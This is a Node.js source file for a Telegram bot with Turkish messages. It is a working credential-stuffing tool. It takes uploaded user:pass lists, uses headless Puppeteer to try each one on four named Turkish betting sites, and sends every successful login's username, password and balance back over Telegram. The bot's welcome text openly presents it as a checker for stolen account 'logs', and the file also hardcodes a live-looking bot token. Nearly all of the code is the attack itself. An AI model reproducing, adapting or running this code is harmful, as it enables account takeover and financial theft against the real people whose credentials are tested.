const puppeteer = require('puppeteer');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const token = '7085072040:AAEk7LVkS_V37bT7Ltw7tDPYK65R9n4YpP8'; 
const bot = new TelegramBot(token, { polling: true });
const sikisbaslasin = ['2135619900', '313131', '313131'];

// web url
const jojobet = "jojobet914";
const holigan = "holiganbet1024";
const pusula = "pusulabet791";
const matador = "matadorbet682";


bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userName = msg.from.first_name;
  if (sikisbaslasin.includes(chatId.toString())) {	
    bot.sendMessage(chatId, `Merhaba ${userName}, simdi sana yapabileceklerimi anlatıyorum. \nBeni kullanarak bahis sitelerinin loglarını checkleyebilirsin. Destekledigim siteler şunlar; \n • Jojobet \n • Pusulabet \n • Matador \n • Holiganbet \n\n Komut listesinden hangi site için check yapmak istediğini seçip txt dosyasını user:pass formatında ilettikten sonra yapacagin tek sey eline viskini alip yudumlarken giris yapan hesaplarin loglarini seyretmek olacak.. \n Tamamlandi mesaji sana ulasana kadar aynı telegram hesabı üzerinden baska siteler icin check atmamani oneriyorum. \n Ek olarak check sırasında hata mesaji alırsan bet sitelerinin url degisip botu yeniden calistirman gerekecek. Diyeceklerim bu kadar, seytanın bol olsun..`);
  } else {
    bot.sendMessage(chatId, `Üzgünüz, bu botu kullanma izniniz yok. Chat ID niz: ${chatId}`);
  }
});


bot.onText(/\/jojo/, (msg) => {
  const chatId = msg.chat.id;
  if (sikisbaslasin.includes(chatId.toString())) {	
    bot.sendMessage(chatId, "Lütfen kullanıcı adı ve şifrelerin bulunduğu metin dosyasını gönderin:");

    bot.once('document', async (msg) => {
      const chatId = msg.chat.id;
      const fileId = msg.document.file_id;
      const filePath = await bot.downloadFile(fileId, './'); 

      try {
        const accounts = fs.readFileSync(filePath, 'utf8').trim().split('\n');
        bot.sendMessage(chatId, 'Dosya başarıyla alındı. Tarama başlatılıyor...');
        let browser = await puppeteer.launch({ headless: true });
        let page = await browser.newPage();

        await page.goto(`https://www.${jojobet}.com/tr/sports/i`);
        await page.click('.ButtonLogin');

        await page.waitForSelector('input[name="username"]');

        for (const account of accounts) {
          const [username, password] = account.split(':');

          await page.type('input[name="username"]', username);
          await page.type('input[name="password"]', password);
          await page.click('button[type="submit"]');

          await new Promise(resolve => setTimeout(resolve, 20000));

          const balanceElement = await page.$('.FormattedAmount');

          if (balanceElement) {
            const bakiye = await page.evaluate(element => element.textContent, balanceElement);
            console.log(`Giriş başarılı! Kullanıcı: ${username}, Bakiye: ${bakiye}`);
            bot.sendMessage(chatId, `✅BAŞARILI -- JOJOBET: ${username} : ${password} : ${bakiye}`);
            await browser.close();
            browser = await puppeteer.launch({ headless: true }); 
            page = await browser.newPage(); 
            await page.goto(`https://www.${jojobet}.com/tr/sports/i`); 
            await page.click('.ButtonLogin'); 
            await page.waitForSelector('input[name="username"]');
          } else {
            console.log(`Giriş başarısız! Kullanıcı: ${username}`);
            await page.goto(`https://www.${jojobet}.com/tr/sports/i`); 
            await page.click('.ButtonLogin'); 
            await page.evaluate(() => {
              document.querySelector('input[name="username"]').value = '';
              document.querySelector('input[name="password"]').value = '';
            });
          }
        }
        bot.sendMessage(chatId, 'Tarama tamamlandı.');
        await browser.close();
      } catch (error) {
        console.error("Bir hata oluştu:", error);
        bot.sendMessage(chatId, "Bir hata oluştu, lütfen gönderdiğiniz dosyayı kontrol edin ve tekrar deneyin.");
      }
    });
  } else {
    bot.sendMessage(chatId, `Üzgünüz, bu botu kullanma izniniz yok. Chat ID niz: ${chatId}`);
  }
  

});


bot.onText(/\/holigan/, (msg) => {
  const chatId = msg.chat.id;
  if (sikisbaslasin.includes(chatId.toString())) {	
    bot.sendMessage(chatId, "Lütfen kullanıcı adı ve şifrelerin bulunduğu metin dosyasını gönderin:");

    bot.once('document', async (msg) => {
      const chatId = msg.chat.id;
      const fileId = msg.document.file_id;
      const filePath = await bot.downloadFile(fileId, './'); 

      try {
        const accounts = fs.readFileSync(filePath, 'utf8').trim().split('\n');
        bot.sendMessage(chatId, 'Dosya başarıyla alındı. Tarama başlatılıyor...');
        let browser = await puppeteer.launch({ headless: true });
        let page = await browser.newPage();

        await page.goto(`https://www.${holigan}.com/tr/sports/i`);
        await page.click('.ButtonLogin');

        await page.waitForSelector('input[name="username"]');

        for (const account of accounts) {
          const [username, password] = account.split(':');

          await page.type('input[name="username"]', username);
          await page.type('input[name="password"]', password);
          await page.click('button[type="submit"]');

          await new Promise(resolve => setTimeout(resolve, 5000));

          const balanceElement = await page.$('.FormattedAmount');

          if (balanceElement) {
            const bakiye = await page.evaluate(element => element.textContent, balanceElement);
            console.log(`Giriş başarılı! Kullanıcı: ${username}, Bakiye: ${bakiye}`);
            bot.sendMessage(chatId, `✅BAŞARILI -- HOLİGANBET: ${username} : ${password} : ${bakiye}`);
            await browser.close();
            browser = await puppeteer.launch({ headless: true }); 
            page = await browser.newPage(); 
            await page.goto(`https://www.${holigan}.com/tr/sports/i`); 
            await page.click('.ButtonLogin'); 
            await page.waitForSelector('input[name="username"]');
          } else {
            console.log(`Giriş başarısız! Kullanıcı: ${username}`);
            await page.goto(`https://www.${holigan}.com/tr/sports/i`);
            await page.click('.ButtonLogin');
            await page.evaluate(() => {
              document.querySelector('input[name="username"]').value = '';
              document.querySelector('input[name="password"]').value = '';
            });
          }
        }
        bot.sendMessage(chatId, 'Tarama tamamlandı.');
        await browser.close();
      } catch (error) {
        console.error("Bir hata oluştu:", error);
        bot.sendMessage(chatId, "Bir hata oluştu, lütfen gönderdiğiniz dosyayı kontrol edin ve tekrar deneyin.");
      }
    });
  } else {
    bot.sendMessage(chatId, `Üzgünüz, bu botu kullanma izniniz yok. Chat ID niz: ${chatId}`);
  }


});


bot.onText(/\/pusula/, (msg) => {
  const chatId = msg.chat.id;
  if (sikisbaslasin.includes(chatId.toString())) {	
    bot.sendMessage(chatId, "Lütfen kullanıcı adı ve şifrelerin bulunduğu metin dosyasını gönderin:");

    bot.once('document', async (msg) => {
      const chatId = msg.chat.id;
      const fileId = msg.document.file_id;
      const filePath = await bot.downloadFile(fileId, './'); 

      try {
        const accounts = fs.readFileSync(filePath, 'utf8').trim().split('\n');
        bot.sendMessage(chatId, 'Dosya başarıyla alındı. Tarama başlatılıyor...');
        let browser = await puppeteer.launch({ headless: true });
        let page = await browser.newPage();

        await page.goto(`https://www.${pusula}.com/tr/sports/i/`);
        await page.evaluate(() => {
          const buttons = document.querySelectorAll('button');
          buttons.forEach(button => {
            if (button.innerText === 'Bir Daha Gösterme') {
              button.click();
            }
          });
        });
        await page.click('.ButtonLogin');

        await page.waitForSelector('input[name="username"]');

        for (const account of accounts) {
          const [username, password] = account.split(':');

          await page.type('input[name="username"]', username);
          await page.type('input[name="password"]', password);
          await page.click('button[type="submit"]');

          await new Promise(resolve => setTimeout(resolve, 7000));

          const balanceElement = await page.$('.FormattedAmount');

          if (balanceElement) {
            const bakiye = await page.evaluate(element => element.textContent, balanceElement);
            console.log(`Giriş başarılı! Kullanıcı: ${username}, Bakiye: ${bakiye}`);
            bot.sendMessage(chatId, `✅BAŞARILI -- PUSULABET: ${username} : ${password} : ${bakiye}`);
            await browser.close();
            browser = await puppeteer.launch({ headless: true }); 
            page = await browser.newPage(); 
            await page.goto(`https://www.${pusula}.com/tr/sports/i/`); 
            await page.evaluate(() => {
              const buttons = document.querySelectorAll('button');
              buttons.forEach(button => {
                if (button.innerText === 'Bir Daha Gösterme') {
                  button.click();
                }
              });
            });
            await page.click('.ButtonLogin'); 
            await page.waitForSelector('input[name="username"]');
          } else {
            console.log(`Giriş başarısız! Kullanıcı: ${username}`);
            await page.goto(`https://www.${pusula}.com/tr/sports/i/`);

            await page.click('.ButtonLogin');
            await page.evaluate(() => {
              document.querySelector('input[name="username"]').value = '';
              document.querySelector('input[name="password"]').value = '';
            });
          }
        }
        bot.sendMessage(chatId, 'Tarama tamamlandı.');
        await browser.close();
      } catch (error) {
        console.error("Bir hata oluştu:", error);
        bot.sendMessage(chatId, "Bir hata oluştu, lütfen gönderdiğiniz dosyayı kontrol edin ve tekrar deneyin.");
      }
    });
  } else {
    bot.sendMessage(chatId, `Üzgünüz, bu botu kullanma izniniz yok. Chat ID niz: ${chatId}`);
  }


});





bot.onText(/\/matador/, async (msg) => {
  const chatId = msg.chat.id;
  if (sikisbaslasin.includes(chatId.toString())) {	
    bot.sendMessage(chatId, "Lütfen kullanıcı adı ve şifrelerin bulunduğu metin dosyasını gönderin:");

    bot.once('document', async (msg) => {
      const chatId = msg.chat.id;
      const fileId = msg.document.file_id;
      const filePath = await bot.downloadFile(fileId, './'); 

      try {
        const accounts = fs.readFileSync(filePath, 'utf8').trim().split('\n');
        bot.sendMessage(chatId, 'Dosya başarıyla alındı. Tarama başlatılıyor...');
        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();
        await page.goto(`https://${matador}.com/login`);

        for (const account of accounts) {
          const [username, password] = account.split(':');

          try {
            await page.waitForSelector('input[id="login-username"]');
            await page.type('input[id="login-username"]', username);
            await page.type('input[id="login-password"]', password);
            await Promise.all([
              page.click('button[type="submit"]')
              ]);

            const balance = await page.waitForSelector('.top-amount', { timeout: 3000 })
            .then(() => page.evaluate(() => {
              const balanceElement = document.querySelector('.top-amount');
              return balanceElement ? balanceElement.textContent.trim() : null;
            }));

            if (balance) {
              console.log(`Bakiye: ${balance} // Kullanıcı adı: ${username} // Şifre: ${password}`);
              bot.sendMessage(chatId, `✅ MATADOR -- Bakiye: ${balance} // Kullanıcı adı: ${username} // Şifre: ${password}`);
            } else {
              console.log(`Giriş başarısız! Kullanıcı adı: ${username}, Şifre: ${password}`);
            }
          } catch (error) {
            console.log(`Giriş başarısız! Kullanıcı adı: ${username}, Şifre: ${password}`);
          }

          await page.goto(`https://${matador}.com/logout`);
          await page.goto(`https://${matador}.com/login`);
        }
        bot.sendMessage(chatId, 'Tarama tamamlandı.');
        await browser.close();
      } catch (error) {
        console.error("Bir hata oluştu:", error);
        bot.sendMessage(chatId, "Bir hata oluştu, lütfen gönderdiğiniz dosyayı kontrol edin ve tekrar deneyin.");
      }
    });
  } else {
    bot.sendMessage(chatId, `Üzgünüz, bu botu kullanma izniniz yok. Chat ID niz: ${chatId}`);
  }

  // REC9P - 10.05.2024
  
});
